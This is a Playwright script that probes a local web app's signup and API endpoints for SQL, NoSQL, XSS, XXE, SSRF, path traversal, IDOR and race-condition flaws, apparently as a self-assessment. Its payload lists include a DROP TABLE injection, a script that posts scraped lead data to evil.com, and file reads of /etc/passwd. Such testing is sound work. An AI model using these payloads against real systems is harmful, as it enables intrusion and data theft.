const { chromium } = require('playwright');

const BASE_URL = 'http://localhost:3001';

// Advanced attack payloads
const ADVANCED_SQL_PAYLOADS = [
  "admin@test.com' AND 1=1--",
  "admin@test.com' UNION SELECT null,null,null--",
  "admin@test.com'; DROP TABLE users--",
  "admin@test.com' OR EXISTS(SELECT * FROM users WHERE role='admin')--",
  "1' OR '1' = '1')) UNION SELECT null, @@version--",
  "' OR pg_sleep(5)--",
  "admin@test.com'/**/OR/**/1=1--",
  "admin@test.com' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
];

const XSS_PAYLOADS = [
  "<script>fetch('/api/leads').then(r=>r.json()).then(d=>fetch('http://evil.com/steal',{method:'POST',body:JSON.stringify(d)}))</script>",
  "<img src=x onerror=\"localStorage.setItem('pwned','true')\">",
  "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://evil.com/hook.js\\';document.body.appendChild(a)')",
  "<svg onload=alert(document.cookie)>",
  "'><script>alert(String.fromCharCode(88,83,83))</script>"
];

const NOSQL_PAYLOADS = [
  '{"$ne": null}',
  '{"$gt": ""}',
  '{"$regex": ".*"}',
  '{"email": {"$ne": null}, "password": {"$ne": null}}'
];

async function advancedSecurityTest() {
  const browser = await chromium.launch({ headless: false }); // Non-headless to detect UI vulnerabilities
  const context = await browser.newContext({
    ignoreHTTPSErrors: true,
    bypassCSP: true // Try to bypass CSP
  });
  const page = await context.newPage();

  const vulnerabilities = [];

  console.log('='.repeat(80));
  console.log('🔴 ADVANCED SECURITY TESTING: Deep Authentication Bypass');
  console.log('='.repeat(80));

  // Test 1: Advanced SQL Injection with timing attacks
  console.log('\n🔍 Test 1: Advanced SQL Injection with timing attacks...\n');

  for (const payload of ADVANCED_SQL_PAYLOADS) {
    try {
      const startTime = Date.now();
      const response = await page.request.post(`${BASE_URL}/api/auth/signup`, {
        data: {
          email: payload,
          password: 'test123',
          name: 'Test',
          organizationName: 'Test'
        }
      });
      const endTime = Date.now();
      const responseTime = endTime - startTime;

      // Check for timing-based SQL injection
      if (responseTime > 5000 && payload.includes('sleep')) {
        vulnerabilities.push({
          severity: 'CRITICAL',
          type: 'Blind SQL Injection',
          endpoint: '/api/auth/signup',
          payload: payload,
          description: `Time-based SQL injection detected - response took ${responseTime}ms`
        });
        console.log(`🚨 CRITICAL: Time-based SQL injection with payload: ${payload}`);
      }

      const body = await response.text();
      if (body.includes('syntax') || body.includes('SQL') || body.includes('column')) {
        vulnerabilities.push({
          severity: 'HIGH',
          type: 'SQL Injection Error',
          endpoint: '/api/auth/signup',
          payload: payload,
          description: 'SQL error revealed in response'
        });
        console.log(`⚠️ HIGH: SQL error with payload: ${payload}`);
      }
    } catch (error) {
      // Continue testing
    }
  }

  // Test 2: NoSQL Injection attempts
  console.log('\n🔍 Test 2: NoSQL Injection attempts...\n');

  for (const payload of NOSQL_PAYLOADS) {
    try {
      const response = await page.request.post(`${BASE_URL}/api/auth/signup`, {
        headers: {
          'Content-Type': 'application/json'
        },
        data: payload
      });

      if (response.status() === 200 || response.status() === 201) {
        vulnerabilities.push({
          severity: 'CRITICAL',
          type: 'NoSQL Injection',
          endpoint: '/api/auth/signup',
          payload: payload,
          description: 'NoSQL injection successful'
        });
        console.log(`🚨 CRITICAL: NoSQL injection with: ${payload}`);
      }
    } catch (error) {
      // Continue
    }
  }

  // Test 3: Path Traversal in API endpoints
  console.log('\n🔍 Test 3: Path Traversal attacks...\n');

  const pathTraversalEndpoints = [
    '/api/../../../etc/passwd',
    '/api/auth/../../../.env',
    '/api/leads/../../../package.json',
    '/api/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
  ];

  for (const endpoint of pathTraversalEndpoints) {
    const response = await page.request.get(`${BASE_URL}${endpoint}`);
    const body = await response.text();

    if (body.includes('root:') || body.includes('SUPABASE') || body.includes('"name"')) {
      vulnerabilities.push({
        severity: 'CRITICAL',
        type: 'Path Traversal',
        endpoint: endpoint,
        description: 'Sensitive file accessed via path traversal'
      });
      console.log(`🚨 CRITICAL: Path traversal at ${endpoint}`);
    }
  }

  // Test 4: HTTP Parameter Pollution
  console.log('\n🔍 Test 4: HTTP Parameter Pollution...\n');

  const hppResponse = await page.request.get(`${BASE_URL}/api/leads?role=user&role=admin`);
  if (hppResponse.status() === 200) {
    vulnerabilities.push({
      severity: 'MEDIUM',
      type: 'HTTP Parameter Pollution',
      endpoint: '/api/leads',
      description: 'Multiple parameter values accepted'
    });
    console.log(`⚠️ MEDIUM: HTTP Parameter Pollution detected`);
  }

  // Test 5: Subdomain Takeover Check
  console.log('\n🔍 Test 5: Testing subdomain access...\n');

  const subdomains = ['admin', 'api', 'staging', 'dev', 'test'];
  for (const subdomain of subdomains) {
    try {
      await page.goto(`http://${subdomain}.localhost:3001/dashboard`, {
        waitUntil: 'domcontentloaded',
        timeout: 5000
      });

      if (!page.url().includes('login')) {
        vulnerabilities.push({
          severity: 'HIGH',
          type: 'Subdomain Access',
          endpoint: `${subdomain}.localhost:3001`,
          description: 'Subdomain allows unauthorized access'
        });
        console.log(`⚠️ HIGH: Subdomain ${subdomain} allows access`);
      }
    } catch (error) {
      // Subdomain doesn't exist or timeout
    }
  }

  // Test 6: IDOR (Insecure Direct Object Reference)
  console.log('\n🔍 Test 6: IDOR vulnerability testing...\n');

  const idorEndpoints = [
    '/api/clients/1',
    '/api/clients/2',
    '/api/organizations/1',
    '/api/leads/1',
    '/api/bookings/1'
  ];

  for (const endpoint of idorEndpoints) {
    const response = await page.request.get(`${BASE_URL}${endpoint}`);
    if (response.status() === 200) {
      vulnerabilities.push({
        severity: 'CRITICAL',
        type: 'IDOR',
        endpoint: endpoint,
        description: 'Direct object access without authorization'
      });
      console.log(`🚨 CRITICAL: IDOR vulnerability at ${endpoint}`);
    }
  }

  // Test 7: GraphQL Introspection (if GraphQL exists)
  console.log('\n🔍 Test 7: GraphQL introspection...\n');

  const graphqlResponse = await page.request.post(`${BASE_URL}/graphql`, {
    data: {
      query: `{
        __schema {
          types {
            name
          }
        }
      }`
    }
  });

  if (graphqlResponse.status() === 200) {
    vulnerabilities.push({
      severity: 'MEDIUM',
      type: 'GraphQL Introspection',
      endpoint: '/graphql',
      description: 'GraphQL introspection enabled in production'
    });
    console.log(`⚠️ MEDIUM: GraphQL introspection enabled`);
  }

  // Test 8: Race Condition on signup
  console.log('\n🔍 Test 8: Race condition testing...\n');

  const promises = [];
  const raceEmail = `race${Date.now()}@test.com`;

  for (let i = 0; i < 5; i++) {
    promises.push(
      page.request.post(`${BASE_URL}/api/auth/signup`, {
        data: {
          email: raceEmail,
          password: 'test123',
          name: 'Race Test',
          organizationName: 'Race Org'
        }
      })
    );
  }

  const results = await Promise.all(promises);
  const successCount = results.filter(r => r.status() === 200 || r.status() === 201).length;

  if (successCount > 1) {
    vulnerabilities.push({
      severity: 'HIGH',
      type: 'Race Condition',
      endpoint: '/api/auth/signup',
      description: `Race condition allows duplicate accounts (${successCount} succeeded)`
    });
    console.log(`⚠️ HIGH: Race condition - ${successCount} duplicate accounts created`);
  }

  // Test 9: XXE (XML External Entity) Injection
  console.log('\n🔍 Test 9: XXE Injection...\n');

  const xxePayload = `<?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>&xxe;</data>`;

  const xxeResponse = await page.request.post(`${BASE_URL}/api/auth/signup`, {
    headers: {
      'Content-Type': 'application/xml'
    },
    data: xxePayload
  });

  const xxeBody = await xxeResponse.text();
  if (xxeBody.includes('root:')) {
    vulnerabilities.push({
      severity: 'CRITICAL',
      type: 'XXE Injection',
      endpoint: '/api/auth/signup',
      description: 'XML External Entity injection successful'
    });
    console.log(`🚨 CRITICAL: XXE injection successful`);
  }

  // Test 10: WebSocket Security
  console.log('\n🔍 Test 10: WebSocket security...\n');

  try {
    await page.evaluate(() => {
      const ws = new WebSocket('ws://localhost:3001/ws');
      ws.onopen = () => {
        ws.send(JSON.stringify({ type: 'auth', role: 'admin' }));
      };
      return new Promise(resolve => {
        ws.onmessage = (event) => {
          if (event.data.includes('authenticated')) {
            resolve(true);
          }
        };
        setTimeout(resolve, 2000);
      });
    });
  } catch (error) {
    // WebSocket might not exist
  }

  // Test 11: Cache Poisoning
  console.log('\n🔍 Test 11: Cache poisoning...\n');

  const poisonResponse = await page.request.get(`${BASE_URL}/api/leads`, {
    headers: {
      'X-Forwarded-Host': 'evil.com',
      'X-Forwarded-Port': '1337',
      'X-Original-URL': '/admin'
    }
  });

  if (poisonResponse.headers()['x-cache'] === 'hit') {
    vulnerabilities.push({
      severity: 'MEDIUM',
      type: 'Cache Poisoning',
      endpoint: '/api/leads',
      description: 'Cache can be poisoned with malicious headers'
    });
    console.log(`⚠️ MEDIUM: Cache poisoning possible`);
  }

  // Test 12: Server-Side Request Forgery (SSRF)
  console.log('\n🔍 Test 12: SSRF testing...\n');

  const ssrfPayloads = [
    'http://169.254.169.254/latest/meta-data/',
    'http://localhost:6379',
    'file:///etc/passwd'
  ];

  for (const payload of ssrfPayloads) {
    const response = await page.request.post(`${BASE_URL}/api/auth/signup`, {
      data: {
        email: 'test@test.com',
        password: 'test123',
        name: 'Test',
        organizationName: 'Test',
        webhook_url: payload
      }
    });

    const body = await response.text();
    if (body.includes('ami-id') || body.includes('root:')) {
      vulnerabilities.push({
        severity: 'CRITICAL',
        type: 'SSRF',
        endpoint: '/api/auth/signup',
        payload: payload,
        description: 'Server-Side Request Forgery vulnerability'
      });
      console.log(`🚨 CRITICAL: SSRF vulnerability with ${payload}`);
    }
  }

  await browser.close();

  // Generate Advanced Report
  console.log('\n' + '='.repeat(80));
  console.log('📊 ADVANCED SECURITY ASSESSMENT REPORT');
  console.log('='.repeat(80) + '\n');

  if (vulnerabilities.length === 0) {
    console.log('✅ No advanced vulnerabilities detected.');
    console.log('\nThe application shows good resistance to:');
    console.log('- Advanced SQL injection techniques');
    console.log('- NoSQL injection attempts');
    console.log('- Path traversal attacks');
    console.log('- Race conditions');
    console.log('- XXE injection');
    console.log('- IDOR vulnerabilities');
  } else {
    console.log(`🚨 Found ${vulnerabilities.length} advanced vulnerabilities:\n`);

    const critical = vulnerabilities.filter(v => v.severity === 'CRITICAL');
    const high = vulnerabilities.filter(v => v.severity === 'HIGH');
    const medium = vulnerabilities.filter(v => v.severity === 'MEDIUM');

    if (critical.length > 0) {
      console.log(`🔴 CRITICAL (${critical.length}):`);
      critical.forEach(v => {
        console.log(`\n  Type: ${v.type}`);
        console.log(`  Endpoint: ${v.endpoint || 'N/A'}`);
        if (v.payload) console.log(`  Payload: ${v.payload}`);
        console.log(`  Impact: ${v.description}`);
      });
    }

    if (high.length > 0) {
      console.log(`\n🟠 HIGH (${high.length}):`);
      high.forEach(v => {
        console.log(`\n  Type: ${v.type}`);
        console.log(`  Endpoint: ${v.endpoint || 'N/A'}`);
        if (v.payload) console.log(`  Payload: ${v.payload}`);
        console.log(`  Impact: ${v.description}`);
      });
    }

    if (medium.length > 0) {
      console.log(`\n🟡 MEDIUM (${medium.length}):`);
      medium.forEach(v => {
        console.log(`\n  Type: ${v.type}`);
        console.log(`  Endpoint: ${v.endpoint || 'N/A'}`);
        console.log(`  Impact: ${v.description}`);
      });
    }
  }

  console.log('\n' + '='.repeat(80));
  console.log('✅ Advanced security test completed');
  console.log('='.repeat(80) + '\n');
}

advancedSecurityTest().catch(console.error);